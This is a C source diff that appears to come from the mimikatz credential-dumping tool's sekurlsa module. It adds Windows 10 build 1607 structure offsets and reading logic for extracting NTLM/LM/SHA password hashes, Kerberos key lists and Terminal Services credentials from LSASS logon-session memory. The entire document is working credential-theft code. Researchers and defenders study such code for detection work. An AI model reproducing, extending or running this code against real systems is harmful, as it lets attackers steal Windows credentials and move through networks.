@@ -49,9 +49,10 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_msv(IN ULONG_PTR reserved, IN 
 }
 
 const MSV1_0_PRIMARY_HELPER msv1_0_primaryHelper[] = {
-	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LogonDomainName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, UserName), 0, FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isNtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isLmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, ShaOwPassword), 0},
-	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LogonDomainName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, UserName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isNtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isLmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, ShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, align0)},
-	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LogonDomainName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, UserName), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isNtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isLmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, ShaOwPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, align2)},
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LogonDomainName),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, UserName),			0,														FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isNtOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isLmOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isShaOwPassword),			0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, NtOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LmOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, ShaOwPassword),			0,																	0},
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LogonDomainName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, UserName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isNtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isLmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isShaOwPassword),	0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, NtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, ShaOwPassword),	0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, align0)},
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LogonDomainName),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, UserName),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isNtOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isLmOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isShaOwPassword),		0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LmOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, ShaOwPassword),		0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, align2)},
+	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, LogonDomainName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, UserName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isNtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isLmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isShaOwPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isDPAPIProtected),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, ShaOwPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, DPAPIProtected),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, align2)}, // to check ;)
 };
 
 const MSV1_0_PRIMARY_HELPER * kuhl_m_sekurlsa_msv_helper()
@@ -61,8 +62,10 @@ const MSV1_0_PRIMARY_HELPER * kuhl_m_sekurlsa_msv_helper()
 		helper = &msv1_0_primaryHelper[0];
 	else if(NtBuildNumber < KULL_M_WIN_BUILD_10_1511)
 		helper = &msv1_0_primaryHelper[1];
-	else
+	else if(NtBuildNumber < KULL_M_WIN_BUILD_10_1607)
 		helper = &msv1_0_primaryHelper[2];
+	else
+		helper = &msv1_0_primaryHelper[3];
 	return helper;
 }
 
@@ -72,6 +75,8 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, SmartcardInfos),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pKeyList),
+		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
+		sizeof(KERB_HASHPASSWORD_6),
 		sizeof(KIWI_KERBEROS_LOGON_SESSION),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspDataLength),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
@@ -82,6 +87,8 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, SmartcardInfos),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pKeyList),
+		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
+		sizeof(KERB_HASHPASSWORD_6),
 		sizeof(KIWI_KERBEROS_LOGON_SESSION),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspDataLength),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_60, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
@@ -92,6 +99,8 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, credentials),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, SmartcardInfos),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pKeyList),
+		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
+		sizeof(KERB_HASHPASSWORD_6),
 		sizeof(KIWI_KERBEROS_LOGON_SESSION),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_62, CspDataLength),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_62, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
@@ -102,7 +111,21 @@ const KERB_INFOS kerbHelper[] = {
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, credentials),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, SmartcardInfos),
 		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10, pKeyList),
+		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
+		sizeof(KERB_HASHPASSWORD_6),
 		sizeof(KIWI_KERBEROS_LOGON_SESSION_10),
+		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspDataLength),
+		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
+		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData)
+	},
+	{
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, LocallyUniqueIdentifier),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, credentials),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, SmartcardInfos),
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_10_1607, pKeyList),
+		FIELD_OFFSET(KERB_HASHPASSWORD_6_1607, generic),
+		sizeof(KERB_HASHPASSWORD_6_1607),
+		sizeof(KIWI_KERBEROS_LOGON_SESSION_10_1607),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspDataLength),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
 		FIELD_OFFSET(KIWI_KERBEROS_CSP_INFOS_10, CspData)
@@ -126,8 +149,10 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN ULONG_PTR pKerbGlo
 		KerbOffsetIndex = 1;
 	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_10)
 		KerbOffsetIndex = 2;
-	else
+	else if(NtBuildNumber < KULL_M_WIN_BUILD_10_1607)
 		KerbOffsetIndex = 3;
+	else
+		KerbOffsetIndex = 4;
 
 	if(ptr = kuhl_m_sekurlsa_utils_pFromAVLByLuid(pKerbGlobalLogonSessionTable, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId))
 	{
@@ -135,7 +160,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN ULONG_PTR pKerbGlo
 		{
 			if(ReadMemory(ptr, data, (ULONG) kerbHelper[KerbOffsetIndex].structSize, NULL))
 			{
-				kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (data + kerbHelper[KerbOffsetIndex].offsetCreds), pData->LogonId, (NtBuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10);
+				kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (data + kerbHelper[KerbOffsetIndex].offsetCreds), pData->LogonId, (NtBuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : (NtBuildNumber < KULL_M_WIN_BUILD_10_1607) ? KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607);
 
 				if(ptr = (ULONG_PTR) *(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetPin))
 					if(infosCsp = (PBYTE) LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structCspInfosSize))
@@ -155,18 +180,21 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN ULONG_PTR pKerbGlo
 						}
 						LocalFree(infosCsp);
 					}
-						if(ptr = (ULONG_PTR) *(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetKeyList))
-							if(ReadMemory(ptr, &keyList, sizeof(KIWI_KERBEROS_KEYS_LIST_6)/* - sizeof(KERB_HASHPASSWORD_6)*/, NULL))
-								if(pHashPassword = (PKERB_HASHPASSWORD_6) LocalAlloc(LPTR, keyList.cbItem * sizeof(KERB_HASHPASSWORD_6)))
+					if(ptr = (ULONG_PTR) *(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetKeyList))
+						if(ReadMemory(ptr, &keyList, sizeof(KIWI_KERBEROS_KEYS_LIST_6)/* - sizeof(KERB_HASHPASSWORD_6)*/, NULL))
+						{
+							i = keyList.cbItem * (DWORD) kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize;
+							if(pHashPassword = (PKERB_HASHPASSWORD_6) LocalAlloc(LPTR, i))
+							{
+								if(ReadMemory(ptr + sizeof(KIWI_KERBEROS_KEYS_LIST_6)/* - sizeof(KERB_HASHPASSWORD_6)*/, pHashPassword, i, NULL))
 								{
-									if(ReadMemory(ptr + sizeof(KIWI_KERBEROS_KEYS_LIST_6)/* - sizeof(KERB_HASHPASSWORD_6)*/, pHashPassword, keyList.cbItem * sizeof(KERB_HASHPASSWORD_6), NULL))
-									{
-										dprintf("\n\t * Key List\n");
-										for(i = 0; i < keyList.cbItem; i++)
-											kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) (pHashPassword + i), pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST | ((NtBuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10));
-									}
-									LocalFree(pHashPassword);
+									dprintf("\n\t * Key List\n");
+									for(i = 0; i < keyList.cbItem; i++)
+										kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) pHashPassword + i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric), pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST | ((NtBuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10));
 								}
+								LocalFree(pHashPassword);
+							}
+						}
 			}
 			LocalFree(data);
 		}
@@ -188,15 +216,22 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN ULONG_PTR pLiveGlob
 	} else dprintf("KO");
 }
 
+const KIWI_TS_CREDENTIAL_HELPER tsCredentialHelper[] = {
+	{FIELD_OFFSET(KIWI_TS_CREDENTIAL, LocallyUniqueIdentifier),			FIELD_OFFSET(KIWI_TS_CREDENTIAL, pTsPrimary)},
+	{FIELD_OFFSET(KIWI_TS_CREDENTIAL_1607, LocallyUniqueIdentifier),	FIELD_OFFSET(KIWI_TS_CREDENTIAL_1607, pTsPrimary)}
+};
+
 void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_tspkg(IN ULONG_PTR pTSGlobalCredTable, IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
 {
-	KIWI_TS_CREDENTIAL credentials;
 	KIWI_TS_PRIMARY_CREDENTIAL primaryCredential;
 	ULONG_PTR ptr;
-	if(ptr = kuhl_m_sekurlsa_utils_pFromAVLByLuid(pTSGlobalCredTable, FIELD_OFFSET(KIWI_TS_CREDENTIAL, LocallyUniqueIdentifier), pData->LogonId))
+	PVOID buffer;
+	LONG TsOffsetIndex = (NtBuildNumber < KULL_M_WIN_BUILD_10_1607) ? 0 : 1;
+
+	if(ptr = kuhl_m_sekurlsa_utils_pFromAVLByLuid(pTSGlobalCredTable, tsCredentialHelper[TsOffsetIndex].offsetToLuid, pData->LogonId))
 	{
-		if(ReadMemory(ptr, &credentials, sizeof(KIWI_TS_CREDENTIAL), NULL))
-			if(ReadMemory((ULONG_PTR) credentials.pTsPrimary, &primaryCredential, sizeof(KIWI_TS_PRIMARY_CREDENTIAL), NULL))
+		if(ReadMemory(ptr + tsCredentialHelper[TsOffsetIndex].offsetToTsPrimary, &buffer, sizeof(PVOID), NULL))
+			if(ReadMemory((ULONG_PTR) buffer, &primaryCredential, sizeof(KIWI_TS_PRIMARY_CREDENTIAL), NULL))
 				kuhl_m_sekurlsa_genericCredsOutput(&primaryCredential.credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
 	}
 	else dprintf("KO");
